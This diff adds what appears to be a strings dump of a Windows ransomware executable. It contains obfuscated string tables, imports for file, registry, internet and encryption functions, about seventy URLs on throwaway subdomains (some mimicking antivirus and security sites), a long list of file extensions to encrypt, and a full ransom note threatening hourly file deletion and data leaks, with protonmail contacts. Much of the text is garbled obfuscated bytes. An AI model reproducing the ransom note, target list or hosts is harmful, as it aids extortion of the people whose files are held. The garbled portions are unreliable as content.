@@ -1,0 +1,757 @@
+This program must be run under Win32
+P.shell
+@>5:3$
+%&)+*'
+\"#!W
+\"#!O
+%&)+*'
+%&)+*'
++*'%%)
+%&)+*'
+;>8-:0(
+18<45(
+-?7"-8A1
+"#!W6
+;>@5;:?
+;<E>534@
+;>8-:0
+@""#!U
+\"#!U
+;2@C->1(
+;>8-:0(
+;/-81?
+;2@C->1(
+;>8-:0(
+18<45(
+;/-81?
++*'%%)
+/;9/@8
+;:@>;8?
+1/E/81
+\"#!W
++*'%%)
+ww_+*'
+\"#!O
+\"#!O
+qqqq+bW
+qqqq+*
+yy^y]y
+^2ddVLTn
+\_"#U
+/>1-@1
+?1/@5;:
+!:?A<<;>@10
+.5@9-<
+2;>9-@
+/;9/@8
++ >-/7
+A$@4UA$4`s
+-E1>10#5:0;C
+@@>5.A@1?
+qqq2OH
++*'%%)
+C5:05>
+@9<05>
+?E?05>
+-:-31>Y
+ -4;9-
+U?$+*'
+;2@C->1(
+91??-31
+@>5:3
+ 591>Y
+19;>E!W
+581@>1-9"
+U)pU)lU
+19;>E@>1-9"P
+;>9-@@>\"W
+-:0;9W
+%&)+*'
+=C1>@EA5;<')-?0234678
+FD/B.:9
+;:@1:@
+-<<85/-@5;:
+A>81:/;010
+A@4;>5F-@5;:
+@>1-9
+;:B1>@;>Y
++*'%%)
+5:0\!W
+-.18\!W
+2+18?1Y
++*'%%)
+%&)+*'
++*'%%)
+;?5@5;:W
+5811->/4"P
+581 ;;8?\!W
+%&)+*'
+0;#;>7
+581@>1-9!W
+?@>1-9
+<>;<1>@E
+1<8-/1W
+8191:@W
+<<85/-@5;:\"
+1??-31Y
++*'%%)
+1:3@4W
+;>\"#!W
++*'%%)
+8191:@+
+-./0123456789:;<=>?@ABCDEF
+>1?@->@
+B??-095:
+0181@1
+?4-0;C?
+(!?1>?
+@-71;C:
+(!?1>?
+5/-/8?
+(!?1>?
+-./0123456789:;<=>?@ABCDEF
+;F588-
+/;9<-@5.81
+#5:0;C?
+(!?1>?
+DA1?;?
+A:@591
+@;;8@5<?+/8-??
+ !"#$%&-./0123456789:;<=>?@ABCDEF
+GetCurrentThreadId
+DeleteCriticalSection
+LeaveCriticalSection
+EnterCriticalSection
+InitializeCriticalSection
+VirtualFree
+VirtualAlloc
+LocalFree
+LocalAlloc
+VirtualQuery
+lstrlenA
+lstrcpyA
+LoadLibraryExA
+GetThreadLocale
+GetStartupInfoA
+GetModuleFileNameA
+GetLocaleInfoA
+GetLastError
+GetCommandLineA
+FreeLibrary
+ExitProcess
+WriteFile
+SetFilePointer
+SetEndOfFile
+RtlUnwind
+ReadFile
+RaiseException
+GetStdHandle
+GetFileSize
+GetFileType
+CreateFileA
+CloseHandle
+GetKeyboardType
+MessageBoxA
+RegQueryValueExA
+RegOpenKeyExA
+RegCloseKey
+VariantCopyInd
+VariantClear
+SysFreeString
+SysReAllocStringLen
+SysAllocStringLen
+TlsSetValue
+TlsGetValue
+LocalAlloc
+GetModuleHandleA
+GetModuleFileNameA
+RegSetValueExA
+RegQueryValueExA
+RegOpenKeyExA
+RegCreateKeyExA
+RegCloseKey
+WritePrivateProfileStringA
+WriteFile
+WaitForSingleObject
+WaitForMultipleObjects
+TerminateThread
+SetFilePointer
+SetEvent
+SetEndOfFile
+ResumeThread
+ReadFile
+MoveFileA
+LockResource
+LoadResource
+LoadLibraryA
+GlobalDeleteAtom
+GlobalAddAtomA
+GetWindowsDirectoryA
+GetTempPathA
+GetTempFileNameA
+GetSystemTime
+GetSystemDirectoryA
+GetProcAddress
+GetPrivateProfileIntA
+GetModuleHandleA
+GetModuleFileNameA
+GetLastError
+GetFileSize
+GetFileAttributesA
+GetExitCodeThread
+GetExitCodeProcess
+GetCommandLineA
+FreeResource
+FreeLibrary
+FormatMessageA
+FindResourceA
+FindNextFileA
+FindFirstFileA
+FindClose
+DeleteFileA
+CreateThread
+CreateProcessA
+CreateFileA
+CreateEventA
+CloseHandle
+StretchDIBits
+SetWindowOrgEx
+SetTextColor
+SetROP2
+SetBrushOrgEx
+SetBkMode
+SetBkColor
+SelectObject
+SelectClipRgn
+SaveDC
+RestoreDC
+MoveToEx
+IntersectClipRect
+GetWindowOrgEx
+GetTextExtentPoint32A
+GetStockObject
+GetObjectA
+GetDeviceCaps
+GetClipBox
+ExcludeClipRect
+DeleteObject
+DeleteDC
+CreateSolidBrush
+CreateRectRgnIndirect
+CreateRectRgn
+CreateFontIndirectA
+CreateDIBSection
+CreateCompatibleDC
+CreateCompatibleBitmap
+CombineRgn
+BitBlt
+WaitMessage
+ValidateRect
+UpdateWindow
+UnregisterHotKey
+TranslateMessage
+ShowWindow
+SetWindowTextA
+SetWindowPos
+SetWindowLongA
+SetTimer
+SetPropA
+SetFocus
+SetCursor
+SetCapture
+SendMessageA
+ScreenToClient
+RemovePropA
+ReleaseDC
+ReleaseCapture
+RegisterWindowMessageA
+RegisterHotKey
+RegisterClassA
+PostQuitMessage
+PostMessageA
+PeekMessageA
+OffsetRect
+MoveWindow
+MessageBoxA
+MapVirtualKeyA
+LoadIconA
+LoadCursorA
+KillTimer
+IsZoomed
+IsWindowVisible
+IsWindowEnabled
+IsWindow
+IsIconic
+InvalidateRgn
+InvalidateRect
+GetWindowTextLengthA
+GetWindowTextA
+GetWindowRect
+GetWindowLongA
+GetWindowDC
+GetUpdateRgn
+GetUpdateRect
+GetSystemMenu
+GetSysColor
+GetPropA
+GetParent
+GetWindow
+GetKeyState
+GetKeyNameTextA
+GetFocus
+GetCursorPos
+GetClientRect
+GetClassLongA
+GetClassInfoA
+GetCapture
+GetAsyncKeyState
+FillRect
+EndPaint
+EnableWindow
+EnableMenuItem
+DispatchMessageA
+DestroyWindow
+DestroyIcon
+DestroyAcceleratorTable
+DeleteMenu
+DefWindowProcA
+CreateWindowExA
+CopyImage
+ClientToScreen
+CallWindowProcA
+BeginPaint
+CharLowerA
+SHFileOperationA
+InitCommonControls
+InternetSetOptionA
+InternetReadFile
+InternetOpenUrlA
+InternetOpenA
+InternetConnectA
+InternetCloseHandle
+HttpSendRequestA
+HttpQueryInfoA
+HttpOpenRequestA
+CryptDestroyHash
+CryptHashData
+CryptCreateHash
+CryptDecrypt
+CryptEncrypt
+CryptDeriveKey
+CryptSetKeyParam
+CryptGetKeyParam
+CryptDestroyKey
+CryptGetDefaultProviderA
+CryptReleaseContext
+CryptAcquireContextA
+0,080<0@0D0H0L0P0T0b0j0r0z0
+1"1*121:1B1J1R1Z1
+7:8W8b8m8u8
+9)959=9H9N9[9a9{9
+:#:;:Z:r:z:
+:;?;];o<|<
+>7><>B>
+?1?O?[?c?
+0%0+040;0@0F0Y0b0
+1"121R1j1
+2&2,242
+3)33393A3G3M3T3^3
+4-4K4W4_4
+5#5<5U5i5w5
+7M7]7s7
+=#>6>J>~>
+?"?5?:???a?o?w?|?
+J0V0b0n0
+1z1&2O2V2]2
+5/6;6B6L6[6e6o6
+7/747>7C7R7\7f7s7
+8"838V8k8t8y8~8
+9&9.969>9F9N9V9^9f9n9v9~9
+:&:.:6:>:F:N:V:^:f:n:v:~:
+;&;.;6;>;F;N;V;^;f;n;v;~;
+<&<.<6<><F<N<V<^<f<n<v<~<
+=&=.=6=>=F=N=V=^=f=n=v=~=
+>.>;>G>T>f>s>
+?(?,?0?<?@?D?H?T?X?\?h?l?p?|?
+0#0+050:0?0
+4+434C4k4q4x4
+7r8H9R9g9v9
+>z>9?F?W?
+>#>/>G>S>Z>v>
+171O1Y1
+3U4q4v4
+8P9n9r9v9z9~9
+5%7F7^8
+9)9V9\9
+=#=)=^==>
+:6:d:n:
+6)757j8
+9.9;9G9T9f9l9
+:(:3:L:u:
+:-;:;W;
+;:<G<d<
+>:>G>h>
+? ?$?C?
+010>0Y0f0o0
+1)161?1i1v1
+4$484A4W4
+6$6.646F6V6\6h6|6
+7"7,767@7x7
+;(;:;G;S;`;r;
+< <$<(<,<0<4<8<<<@<D<H<L<P<T<X<\<`<d<r<z<
+<Z=j=y=
+61]1r1
+7.7B7L7Q7`7o7{7
+8 8$8(8,8:8
+='=A=G=
+>O>Y>|>
+4,4J4h4
+4G5S5Z5l5~5
+6 6$6(6,606>6F6N6{6
+7;7G7T7f7l7
+9 92989D9X9`9d9h9l9p9t9x9|9
+:1:G:S:`:r:x:
+0"0(0H0P0T0X0\0`0d0h0l0p0
+1 12181D1X1`1d1h1l1p1t1x1|1
+4 4$4(4,404>4F4N4V4}4
+5?5d5u5z5
+6*606P6X6\6`6d6h6l6p6t6x6
+6$7;7G7T7f7n7v7~7
+:#:*:4:F:V:d:p:
+<G=Z=e>m>
+2 2$2(262
+5 5.565>5i5
+7#707B7H7T7h7p7t7x7|7
+;V;Z;^;b;f;j;n;
+<9=B=s=
+>)>7>E>R>c>
+?&?.?6?>?F?N?V?^?f?n?v?~?
+3$383@3D3H3L3P3T3X3\3`3n3v3~3
+66,6>6O7[7h7z7
+9.949@9T9\9`9d9h9l9p9t9x9|9
+<$<8<@<D<H<L<P<T<X<\<`<n<v<~<
+1(1:1B1T1`1t1|1
+1-2_2k2x2
+2 3k3w3
+6 6$6(6,6064686<6@6D6H6L6P6T6X6\6`6d6h6l6p6t6x6|6
+8L9U9w9
+>0><>P>X>\>`>d>h>l>p>t>x>
+1/1<1~1
+5 5.565>5o5
+9K9W9d9v9|9
+97:@:_:k:x:
+<'<4<F<L<`<t<
+= =2=8=X=`=d=h=l=p=t=x=|=
+=">K>k>w>
+:0T0o0
+2"3O3x3
+5+676>6P6b6o6|6
+7;7?7C7G7K7O7S7
+;$;,;0;4;8;<;@;D;H;L;l;
+;#</<<<N<T<`<t<|<
+>">*>S>#?G?S?`?r?x?
+0#000B0H0h0p0t0x0|0
+1171F1U1d1
+5 5@5H5L5P5T5X5\5`5d5h5
+8Q8]8l8
+839c9o9~9
+;:;F;U;|;
+;&<3<s<
+00E0Q0
+3*3P3b3
+<&<`<y<
+090]0s0
+7727D7H7L7P7T7X7\7`7d7h7l7p7t7x7|7
+8 8$8(8,8084888<8@8D8H8L8P8T8X8\8`8d8h8l8p8t8x8|8
+9 9$9(9,9094989<9@9D9H9L9T9d9q9
+0 1$1(1,14181<1@1D1H1L1P1T1X1\1h1l1p1t1x1|1
+4 4$4(4,4044484<4
+eeeeee
+eeeeee
+eeeeeee
+eeeeeeeeeee
+eeeeee
+eeeeee
+eeeeeeee
+eeeeeeee
+eeeeee
+eeeeee
+eeeeeee
+http://fileshare.co.gp/
+http://xk0o5ckmn4isz24.4.je/
+http://download-games.asia.cm/
+http://musicmp3.eu.cr/
+http://sitebuilder.eu.cr/
+http://horror24gang.eur.lc/
+http://emsisoft.id.gp/
+http://avast.ac6.de/
+http://bleepingcomputer.center.tl/
+http://crackme.byto.de/
+http://myusdtorub24exchange.free.lc/
+http://sweethomemyfamily.hund.in/
+http://medicalinf.int.ps/
+http://wordpress-night-world.clan-base.de/
+http://multfilms18.city.tl/
+http://kulinaryselenoypavlovoy.hund.in/
+http://buyhomebezposrednikov.gxuz.com/
+http://my-shop-2021.da.cx/
+http://country-statistics.da.cx/
+http://grafic-zarplan2021.im-internet.eu/
+http://booklibrary.gr.kg/
+http://download-free-films.kilu.org/
+http://uploadyourfiles.ist-ok.de/
+http://icons-archive.com24.at/
+http://contactmyflatform.look.in/
+http://quickwashing.sv.gp/
+http://itsweezle.pk.gp/
+http://dukeata.job.ec/
+http://topagency.com24.at/
+http://bkj2002.gilde.in/
+http://rochun.hilfe24h.de/
+http://realizaweb.party.lc/
+http://pmvraetsel.netz.tl/
+http://fdhk.hjxi.com/
+http://iihttanzania.hjxi.com/
+http://ezdesigns.l4n.org/
+http://anakhita.on-air.de/
+http://youyouwj.lrxi.com/
+http://spovahealth.lu.kg/
+http://etbnaman.anschiessen.de/
+http://xiaowo.xl.lc/
+http://gacetaeditorial.kurzschliessen.de/
+http://codsambal.nl.gp/
+http://bharattimeslive.fun.gg/
+http://menol.kilu.at/
+http://megasolucoesti.uploader.eu/
+http://mashumarobody.gkiv.com/
+http://moviemixture.live-stream.eu/
+http://qantimagroup.m.vu/
+http://headonizm.hu.gp/
+http://thebestfikrah.srv1.org/
+http://priyabeatus.lu.kg/
+http://adventureitdate.mp3.cr/
+http://dubai-homes.hu.gp/
+http://buyparrotsaustralia.owmx.com/
+http://shubhinfoways.fqrd.com/
+http://ramukakaonline.aw3.de/
+http://skenglish.design.tl/
+http://rviradeals.community.lc/
+http://elseelektrikci.euro.lc/
+http://tatcogroup.links.lc/
+http://ta-behesht.l4n.org/
+http://deepikarai.europa.lc/
+http://yeuquynhnhai.il.gp/
+http://atnimanvilla.fqrd.com/
+http://onlyyoursitebest.mail.ht/
+http://cuahangphongthuy.live2.de/
+http://celebritytoo.omas.in/
+http://fxvipmaster.qgaw.com/
+http://ourproductreview.pe.gp/
+.rar; .zip; .png; .lnk; .ini; .jpg; .rtf; .jpeg; .pdf; .doc; .docx; .txt; .a; .aac; .a3w; .abk; .abr; .ace; .ace; .acr; .act; .ad; .adf; .adm; .adp; .adr; .ai; .aif; .ani; .ans; .ape; .apk; .arc; .arj; .as; .asc; .asf; .asp; .ato; .aty; .au; .avi; .axx; .b3d; .b64; .bak; .bas; .bat; .bfc; .bg; .bin; .bk2; .k2p; .bmp; .bnk; .bps; .bpt; .brk; .btoa; .bv1; .bwp; .bz; .bz2; .c; .cab; .cal; .cam; .cas; .cbl; .cbt; .cda; .cdr; .cdt; .cfb; .cfg; .cfl; .cfm; .cgm; .chk; .cl; .cl3; .cl4; .cla; .clg; .clk; .cll; .clo; .clp; .clr; .cls; .cmd; .cmv; .cnt; .cpl; .cne; .cnf; .cnv; .cob; .cod; .com; .cpe; .cpi; .cpp; .cpt; .cr2; .crw; .crt; .csv; .css; .cue; .cur; .cv5; .cvi; .cvs; .cvx; .cxf; .cxx; .d; .daa; .daf; .dat; .db; .db2; .dbc; .dbf; .dbk; .dbm; .dbo; .dbq; .dbt; .dbv; .dbw; .dbx; .dcm; .dcr; .dcx; .dds; .deb; .dev; .dib; .dif; .djvu; .dll; .dmo; .dmp; .dmd; .dmf; .dms; .dne; .dng; .dos; .dot; .drv; .drw; .dt_; .dta; .dtd; .dtf; .dtm; .dun; .dx; .dxf; .dxn; .dxr; .dyn; .dwf; .dwg; .ecw; .eeb; .eef; .eft; .ega;
+.elg; .emf; .eml; .emu; .enc; .end; .eng; .env; .epg; .eps; .eqn; .erd; .erm; .err; .esh; .evt; .ex3; .exc; .exd; .exe; .ext; .fcp; .fdf; .fes; .ff; .ffa; .fff; .ffl; .ffo; .fft; .ffx; .fits; .flac; .flv; .fnd; .fon; .fpb; .fpr; .fpx; .fqy; .fr3; .frc; .frf; .frg; .frk; .frm; .fro; .frp; .frs; .frt; .frx; .frz; .fsc; .fsh; .g3; .gho; .gif; .gr2; .gr3; .gra; .grb; .grf; .grp; .gz; .hbk; .hdl; .hdr; .hdx; .hex; .hfi; .hgl; .hh; .hhh; .hhp; .hlp; .hpgl; .hqx; .hsq; .hss; .hst; .hta; .htm; .html; .htt; .ica; .icb; .icc; .ice; .icl; .icm; .icn; .ico; .ics; .id; .idb; .idd; .ide; .idf; .idq; .idx; .iff; .ifo; .ima; .img; .inf; .ins; .ipd; .ipf; .iso; .iw44; .iwa; .j2k; .jar; .jas; .jef; .jng; .jp2; .jpc; .jpm; .js; .jsb; .jsd; .jse; .jsh; .jsl; .jsm; .jsp; .jss; .json; .jt; .jtf; .jtk; .jtp; .jw; .jwl; .jzz; .kar; .kbc; .kdc; .kdp; .kfx; .kye; .lbm; .ldf; .lgc; .lgo; .lha; .lib; .log; .lnk; .lwf; .lwp; .lzh; .mac; .mbx; .mcd; .md; .mda; .mdb; .mde; .mdf; .mdl; .mdm; .mdn; .mdp; .mdt; .mdw; .mdx; .mdz; .meb; .med;
+.mem; .mht; .mid; .mim; .mix; .mk3d; .mka; .mks; .mkv; .mme; .mng; .mod; .mov; .mp1; .mp2; .mp3; .mpp; .mpg; .mrw; .msc; .msi; .msn; .msp; .mtf; .mtm; .mtv; .mtw; .mu; .mul; .mup; .mus; .mvb; .mve; .mvf; .mwp; .mxd; .mxt; .myd; .n64; .na2; .nab; .nap; .ndf; .nds; .ndx; .nef; .nes; .neta; .nfo; .nil; .ngf; .ngg; .nhf; .nlb; .nld; .nlm; .nmi; .nol; .now; .nra; .nrb; .ngr; .ns2; .ns5; .nso; .nt; .num; .nzb; .oca; .ocx; .ogg; .ogm; .olb; .old; .ole; .oli; .orf; .ori; .qtif; .otl; .pab; .pak; .pb; .pbd; .pbf; .pbk; .pbl; .pbm; .pbr; .pbi; .pbo; .pbt; .pcd; .pcx; .pda; .pdb; .pdd; .pdl; .pds; .pdv; .pdw; .pef; .pf; .pgm; .php; .pic; .pict; .pif; .pjf; .pkg; .pl; .plb; .plc; .pld; .plg; .pli; .pll; .plm; .pln; .plr; .pls; .plt; .ply; .pot; .pp; .pp4; .pp5; .ppa; .ppb; .ppd; .ppf; .ppi; .ppl; .ppm; .ppo; .pps; .ppt; .ppz; .ps2; .psd; .psp; .pst; .pwa; .pwd; .pwf; .pwl; .pwp; .pwz; .px; .pxl; .py; .pyc; .pyd; .pyw; .pza; .pzd; .pzl; .pzo; .pzp; .pzs; .pzt; .pzx; .qic; .qt; .qxd; .qxl; .qxt; .ra; .raf; .ram; .ras;
+.rc; .rd1; .rd3; .rd4; .rd5; .rdb; .rdl; .rdx; .rec; .rgb; .rle; .rmi; .rpb; .rpd; .rpm; .rpt; .rwz; .sav; .sc2; .scp; .scr; .sct; .sd; .sd2; .sda; .sdc; .sdd; .sdf; .sdk; .sdl; .sdn; .sdr; .sds; .sdt; .sdw; .sdx; .se; .sea; .sff; .sfw; .sgi; .sh; .sh3; .shb; .shg; .shk; .shm; .shp; .shr; .shw; .sid; .sit; .sitx; .slk; .smil; .snd; .sng; .snm; .sno; .snp; .spd; .srf; .sum; .sun; .svg; .swf; .swp; .sxc; .sys; .tar; .tar.gz; .tbz; .tbz2; .tdf; .tga; .tgz; .tif; .tlb; .tld; .tle; .tlp; .tlt; .tlx; .tmp; .topc; .trm; .trs; .uni; .unk; .unx; .url; .uu; .uue; .vb; .vba; .vbd; .vbe; .vbg; .vbk; .vbl; .vbp; .vbr; .vbs; .vbw; .vbx; .vbz; .vc; .vcd; .vce; .vcf; .vcs; .vct; .vcw; .vcx; .vda; .vdd; .vdo; .vls; .vm; .vmm; .vmf; .vmh; .vob; .vs2; .vsd; .vsl; .vss; .vst; .vsw; .vxd; .wab; .wad; .wal; .wav; .wb1; .wb2; .wbf; .wbk; .wbmp; .wbt; .wcd; .wcm; .wcp; .wdb; .web; .wfm; .wfn; .wfx; .wg1; .wg2; .wid; .win; .wiz; .wk1; .wk3; .wlg; .wma; .wmf; .wmv; .wmz; .wpd; .wpg; .wpm; .wps; .wri; .wrk; .wsc; .wsf; .x3f; .xap;
+.xbm; .xif; .xlb; .xlr; .xls; .xm; .xml; .xnk; .xot; .xpm; .xqt; .xrf; .xr1; .xsl; .xsm; .xtb; .xwd; .xwf; .xxe; .xy; .xy3; .xy4; .xyp; .xyw; .y; .y01; .yaml; .yuv; .yz; .z; .zoo;
+And hello again. We returned after a long time to prove that we can go unpunished.
+Erica $$$
+Key (Do not change it)
+Your computer/network has been encrypted!
+If you want to return the files, then write to the mail.
+One file will be deleted every 15 minutes. Hurry up. Disabled by pressing Alt + F9.
+5844869519@protonmail.com - Contact us
+6310812891@protonmail.com - Contact us
+6152412247@protonmail.com - Contact us
+1494040670@protonmail.com - Contact us
+5993509759@protonmail.com - Contact us
+4896949806@protonmail.com - Contact us
+8438769274@protonmail.com - Contact us
+6425934071@protonmail.com - Reserve
+2880069676@protonmail.com - Reserve
+2251980267@protonmail.com - Reserve
+We are not interested in computers that have less than 10,000 thousand files that we need.
+If you have less, then write to us and we will decrypt your network for free. The number of encrypted files on your computer or your network %2.
+We value our reputation and are not going to deceive you.
+If you do not pay us, we will give all the data to your competitors!!!
+Kernel32.dll
+GetProcAddress
+GetModuleHandleA
+LoadLibraryA
+VirtualAlloc
+"5>@A-8
+>;@1/@
+71>:18
+A>>1:@ 4>1-0
+>5@5/-81/@5;:
+>5@5/-81/@5;:
+>5@5/-81/@5;:
+:5@5-85F1
+>5@5/-81/@5;:
+"5>@A-8
+"5>@A-8
+"5>@A-8
+8?@>81:
+8?@>/<E
+5.>->E
+1@ 4>1-0
+1@@->@A<
+;99-:0
+5.>->E
+>;/1??
+;5:@1>
+@8!:C5:0
+D/1<@5;:
+5815F1
+581 E<1
+1E.;->0 E<1
+1??-31
+-0B-<5
+A1>E"-8A1
+;81-A@
+"->5-:@
+"->5-:@
+>11@>5:3
+88;/@>5:3
+88;/@>5:3
+71>:18
+ 8?1@"-8A1
+1@"-8A1
+-0B-<5
+131@"-8A1
+A1>E"-8A1
+71>:18
+>5B-@1
+>;2581@>5:3
+;>5:381
+A8@5<81
+.61/@?
+ 1>95:-@1 4>1-0
+;5:@1>
+1?A91 4>1-0
+1?;A>/1
+1?;A>/1
+5.>->E
+1@#5:0;C?
+5>1/@;>E
+1@ 19<
+1@ 19<
+1@E?@19 591
+1@E?@19
+5>1/@;>E
+00>1??
+>5B-@1
+>;2581
+5815F1
+@@>5.A@1?
+;01 4>1-0
+>;/1??
+;99-:0
+1?;A>/1
+5.>->E
+1??-31
+1?;A>/1
+>1-@1 4>1-0
+>;/1??
+@>1@/4
+1@#5:0;C
+1@ 1D@
+181/@
+181/@
+1?@;>1
+:@1>?1/@
+1@#5:0;C
+1@ 1D@
+1@@;/7
+D/8A01
+>1-@1;850
+:05>1/@
+:05>1/@
+1/@5;:
+;9<-@5.81
+;9<-@5.81
+;9.5:1
+1??-31
+"-850-@1
+!<0-@1#5:0;C
+!:>135?@1>
+ >-:?8-@1
+1??-31
+4;C#5:0;C
+1@#5:0;C 1D@
+1@#5:0;C
+1@#5:0;C
+1@ 591>
+-<@A>1
+1??-31
+/>11: ;
+181-?1
+181-?1
+-<@A>1
+135?@1>#5:0;C
+1??-31
+135?@1>
+135?@1>
+1??-31
+1??-31
+1??-31
+;B1#5:0;C
+1??-31
+-<"5>@A-8
+588 591>
+?&;;910
+?#5:0;C"5?5.81
+?#5:0;C
+:-.810
+?#5:0;C
+:B-850-@1
+:B-850-@1
+1@#5:0;C 1D@
+1@#5:0;C 1D@
+1@#5:0;C
+1@#5:0;C
+1@#5:0;C
+1@!<0-@1
+1@!<0-@1
+1@E?@19
+1@#5:0;C
+1E@-@1
+-91 1D@
+-<@A>1
+1E@-@1
+:-.81#5:0;C
+5?<-@/4
+1??-31
+1?@>;E#5:0;C
+1?@>;E
+1?@>;E
+//181>-@;> -.81
+12#5:0;C
+>1-@1#5:0;C
+851:@ ;/>11:
+-88#5:0;C
+<1>-@5;:
+/;9/@8
+;:@>;8?
+C5:5:1@
+:@1>:1@1@
+:@1>:1@
+:@1>:1@
+<1:!>8
+:@1>:1@
+:@1>:1@
+;::1/@
+:@1>:1@
+@@<1:0
+1=A1?@
+1=A1?@
+-0B-<5
+1?@>;E
+1/>E<@
+:/>E<@
+>E<@1@
+1?@>;E
+12-A8@
+>;B501>
+181-?1
+;:@1D@
+/=A5>1
+;:@1D@
